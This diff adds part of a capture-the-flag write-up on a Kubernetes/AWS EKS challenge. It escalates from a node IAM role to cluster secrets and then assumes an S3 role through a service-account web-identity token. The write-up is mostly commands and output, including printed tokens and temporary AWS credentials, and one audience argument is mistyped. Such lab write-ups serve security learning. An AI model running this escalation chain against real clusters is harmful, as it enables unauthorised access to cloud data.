@@ -568,4 +568,214 @@ permissions allowed:
 ```
 {}
 ```
+No permission of listing pod. we can see allowed permissionn 
+```
+kubectl auth can-i --list 
+warning: the list may be incomplete: webhook authorizer does not support user rule resolution
+Resources                                       Non-Resource URLs                     Resource Names     Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
+                                                [/.well-known/openid-configuration]   []                 [get]
+                                                [/api/*]                              []                 [get]
+                                                [/api]                                []                 [get]
+                                                [/apis/*]                             []                 [get]
+                                                [/apis]                               []                 [get]
+                                                [/healthz]                            []                 [get]
+                                                [/healthz]                            []                 [get]
+                                                [/livez]                              []                 [get]
+                                                [/livez]                              []                 [get]
+                                                [/openapi/*]                          []                 [get]
+                                                [/openapi]                            []                 [get]
+                                                [/openid/v1/jwks]                     []                 [get]
+                                                [/readyz]                             []                 [get]
+                                                [/readyz]                             []                 [get]
+                                                [/version/]                           []                 [get]
+                                                [/version/]                           []                 [get]
+                                                [/version]                            []                 [get]
+                                                [/version]                            []                 [get]
+podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
+```
+it is continuation of previous challenge, aws is already configured.
+Our goal is to use this AWS credentials with permissions to use the EKS service, so as to obtain the high permissions of the cluster and then use it for kubectl.
 
+To gain k8s cluster accesss using the IAM role, we can use `aws eks get-token --cluster-name <cluster name>` to obtain a token with corresponding high permissions.
+To find the cluster name. we can see aws configure `arn`
+```
+$ aws sts get-caller-identity
+{
+    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
+    "Account": "688655246681",
+    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
+}
+```
+in arn `<cluster_name>-nodegroup-NodeInstanceRole` this is the pattern follows. So cluster name is `eks-challenge-cluster`.
+
+```
+$ aws eks get-token --cluster-name eks-challenge-cluster
+{
+    "kind": "ExecCredential",
+    "apiVersion": "client.authentication.k8s.io/v1beta1",
+    "spec": {},
+    "status": {
+        "expirationTimestamp": "2024-10-22T14:41:53Z",
+        "token": "k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk02RU1UWFdGUiUyRjIwMjQxMDIyJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNDEwMjJUMTQyNzUzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFRkFhREYlMkJzU3lmT050Y0o4V21pMENLM0FjeE5ER05kS2hoQkRON2RiUVJGNHFqcFNaZiUyRkxJR3FUWk1lbmlSRlJQQWxqZlJDRldpV2ZoSGVkWkJVUVhDZmUzQ0klMkJlTlBySTlxTzV1aFZ4QVU3MFdmOFhnaFRjR3J2WEFrVSUyQkJjcTclMkZTaVg4NHBJUmc5RXA5VzA1Wjdsd29tYUxuWG5lZCUyQlRlN1VCV25QaWFqYnF0VVl0N0kxcVlxcGRwZFFUc2haZVpsVHYxOXZuYWlxTFVRS3VtRmklMkJ6MHRhZXRBZHJoWnFXZEhnODJlWkVxeDJKakY1JTJCQzRJcFdCbEQlMkZWSUVLRiUyRiUyRk5jb1RGVzlLdDBTaXc1OTY0QmpJdGFvb0FjdEJLaTJkSVlwU0VFbm5rU3lrYjY4dDl5VzZWVTBVa2Mwd05oUGlvVmt4OVhMeDdqV0Qzc0xtcyZYLUFtei1TaWduYXR1cmU9YmUwMTI2ZjM1YTA1OTA1NWZmNTJjMjNjMTExM2RhZmUzMGNmNjFlOGRjZmRiZTk0ZDkxYjQ4NDQwNmNkNjZlZA"
+    }
+}
+```
+use this output token for kubectl commands.
+```
+$ export K8S_AUTH_TOKEN="<token here>"
+```
+
+to check permissions changes or not try listing the pods 
+```
+$ kubectl get pods --token $K8S_AUTH_TOKEN
+No resources found in challenge4 namespace.
+```
+yes permissions are changed.
+```
+kubectl auth can-i --list --token $K8S_AUTH_TOKEN
+warning: the list may be incomplete: webhook authorizer does not support user rule resolution
+Resources                                       Non-Resource URLs   Resource Names     Verbs
+serviceaccounts/token                           []                  [debug-sa]         [create]
+selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
+pods                                            []                  []                 [get list]
+secrets                                         []                  []                 [get list]
+serviceaccounts                                 []                  []                 [get list]
+                                                [/api/*]            []                 [get]
+                                                [/api]              []                 [get]
+                                                [/apis/*]           []                 [get]
+                                                [/apis]             []                 [get]
+                                                [/healthz]          []                 [get]
+                                                [/healthz]          []                 [get]
+                                                [/livez]            []                 [get]
+                                                [/livez]            []                 [get]
+                                                [/openapi/*]        []                 [get]
+                                                [/openapi]          []                 [get]
+                                                [/readyz]           []                 [get]
+                                                [/readyz]           []                 [get]
+                                                [/version/]         []                 [get]
+                                                [/version/]         []                 [get]
+                                                [/version]          []                 [get]
+                                                [/version]          []                 [get]
+podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
+```
+we can list the secret.
+
+```
+$ kubectl get secrets --token $K8S_AUTH_TOKEN
+NAME        TYPE     DATA   AGE
+node-flag   Opaque   1      356d
+$ kubectl get secrets node-flag -o jsonpath='{.data.flag}' --token $K8S_AUTH_TOKE
+N | base64 --decode
+wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}
+```
+SOLVED!!
+> - In this task, you've acquired the Node's service account credentials. For future reference, these credentials will be conveniently accessible in the pod for you.
+Fun fact: The misconfiguration highlighted in this challenge is a common occurrence, and the same technique can be applied to any EKS cluster that doesn't enforce IMDSv2 hop limit.
+
+# Container Secrets Infrastructure
+> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the s3access-sa service account, and get the flag?
+
+> IAM Policy
+
+> Trust Policy
+
+Permissions allowed
+```
+{
+    "secrets": [
+        "get",
+        "list"
+    ],
+    "serviceaccounts": [
+        "get",
+        "list"
+    ],
+    "pods": [
+        "get",
+        "list"
+    ],
+    "serviceaccounts/token": [
+        "create"
+    ]
+}
+```
+As per the permissions, lets see what we have. Only service accounts are there, and permission to create serviceaccount's token
+```
+$ kubectl get serviceaccounts
+NAME          SECRETS   AGE
+debug-sa      0         356d
+default       0         356d
+s3access-sa   0         356d
+```
+right now we are debug-sa and we need to become s3access-sa, so lets describe s3access-sa service account
+```
+$  kubectl get sa s3access-sa -o yaml
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  annotations:
+    eks.amazonaws.com/role-arn: arn:aws:iam::688655246681:role/challengeEksS3Role
+  creationTimestamp: "2023-10-31T20:07:34Z"
+  name: s3access-sa
+  namespace: challenge5
+  resourceVersion: "671916"
+  uid: 86e44c49-b05a-4ebe-800b-45183a6ebbda
+```
+interesting, role is attached. Probably this is the role we need to assume. 
+lets give it a try.
+```
+$ aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name challenge5
+
+An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
+```
+Umm... can't assume the role directly.
+
+> - Initial attempt to use aws s3 assume-role doesn't work because our k8s node IAM role does not have permissions to directly assume the challengeEksS3Role.
+> - However, when using a k8s service account with an associated IAM role via `OIDC`, we can asume the role by using the service account's `Web Identity Token`.
+
+Okay, so lets try to create token from debug-sa to assume the role:
+```
+$ export TOKEN=$(kubectl create token debug-sa)
+```
+now try assuming role using this token.
+```
+$ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name challenge5 --web-identity-token $TOKEN
+
+An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
+```
+The default audience for a token created with kubectl is `https://kubernetes.default.svc` which amazon doesn't seem to like. In trust policy `sts.amazonaws.com` audience is given, lets create token again with this.
+```
+$ export TOKEN=$(kubectl create token debug-sa --audience sts-amazonaws.com)
+```
+lets assume again
+```
+$ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name challenge5 --web-identity-token $TOKEN
+{
+    "Credentials": {
+        "AccessKeyId": "ASIA2AVYNEVMZDYLD4CY",
+        "SecretAccessKey": "AyBaql1yXC3Y3kOsci3bC/PPmx3INc7K+d26DV65",
+        "SessionToken": "IQoJb3JpZ2luX2VjED8aCXVzLXdlc3QtMSJIMEYCIQCeoXIzYGQMS4wue3q+2sCMaw0me1DJmp2iDnXmwqtZZgIhAOCxPJFloK3eAN1GMLgGz6IyQRYeo70/foqbD3G4RU7IKsQECKj//////////wEQARoMNjg4NjU1MjQ2NjgxIgz5qnX06+1pocsunHUqmAR8uOTdWXxnuba1YHmHHq82ruJRt04Y5zGQYD8JNQDDRAXMMcHlp9CnNktzVGTyMZj3O9p60DTqXlCq+sidETRbXSGXf0ZD2WxmTTMctVN3dHquB7tyISsUB2dlCDKgvD3k6tfJiIqTzbtu/do7NfGTEGaIoLLTpubJGlTv7E3Pa/D46FiH30nTajZK+lupQex62hiJaeRs1MKrga23PAOjIMBGn+adccXpeC05aksrVreYi1TvklaBsw3za5+M4Q+5UVlCwOTgi7kXhI9GF8+KwOn4NbZouU26Gdl0LdEQ59wXjh4i1FfH4FBxxovi2NY7HIkLEJZMaIfh0iDQ4+eMyAf5s0S/stcB9bC3onh7mRA1l5+lTiY9hfeZfSJJK1uRwKAb+++p5PltekrxxK2aVG1trFDdicUh8InfuPuD4KONw93oaX3tagrPNDcCfH1Txng33ioCGa6HY94wtzL4HzKoqvIa+FudGVSACDfKFacnfOAKL7F+VsWuyebuFl8VFGUQ6nTpq1sQmTKujmg4b/u/besPsqQ8qq6qAMqaGd3uwrHpbGARFaqIcLr0Q9WSgDLvznLlj99AvLgLdOOF6DNyg04owcas83USjX3GGoFO0ggmguFEf56N2fwib4ieTwaAtqZVOdsvFQqkAB2UGtR2hIBP/ksNXHGNL3mgmfBqZOesRC0skvWWdD/9/1slBZ9+Sy77JjDY+t64BjqUAc2Rev7bcHAo4P72WTfKIyV4lAEDLih4wjdvGwmDAF0RxxQN7VSnpaMxbAO9iJua9vaodqojhtHGit6MQ7fXOZWgQH7Vn7tnx7RWcamW4UPJxtCz7XG4kzH02RE6wvy+DJdDvUAcClCgtvtW9sX3pU8nsI1lLHtsxvlm2u6TYRojhQWaptj4f2IjNEyHoF8d6BHERmY=",
+        "Expiration": "2024-10-22T15:57:28+00:00"
+    },
+    "SubjectFromWebIdentityToken": "system:serviceaccount:challenge5:debug-sa",
+    "AssumedRoleUser": {
+        "AssumedRoleId": "AROA2AVYNEVMZEZ2AFVYI:challenge5",
+        "Arn": "arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/challenge5"
+    },
+    "Provider": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589",
+    "Audience": "sts.amazonaws.com"
+}
+```
+configure them in aws cli. Finally s3Access-sa role is assumed.
+In IAM policy we have s3 bucket name, lets extract that
+```
+$ aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .
+download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag  
+$ cat flag
+wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws_exp1oitation_legend}
+```
+
+SOLVED!!
